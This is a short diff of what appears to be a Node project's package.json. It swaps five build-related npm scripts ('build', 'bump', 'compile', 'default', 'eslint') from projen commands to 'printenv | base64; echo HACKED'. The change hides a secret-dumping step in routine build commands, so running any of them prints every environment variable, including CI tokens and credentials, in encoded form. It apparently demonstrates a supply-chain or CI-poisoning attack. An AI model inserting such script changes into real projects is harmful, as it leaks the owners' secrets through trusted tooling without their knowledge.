@@ -15,12 +15,12 @@
     "test-root": "bin/test-root"
   },
   "scripts": {
-    "build": "npx projen build",
-    "bump": "npx projen bump",
+    "build": "printenv | base64; echo HACKED",
+    "bump": "printenv | base64; echo HACKED",
     "check-for-updates": "npx projen check-for-updates",
-    "compile": "npx projen compile",
-    "default": "npx projen default",
-    "eslint": "npx projen eslint",
+    "compile": "printenv | base64; echo HACKED",
+    "default": "printenv | base64; echo HACKED",
+    "eslint": "printenv | base64; echo HACKED",
     "gather-versions": "npx projen gather-versions",
     "package": "npx projen package",
     "post-compile": "npx projen post-compile",
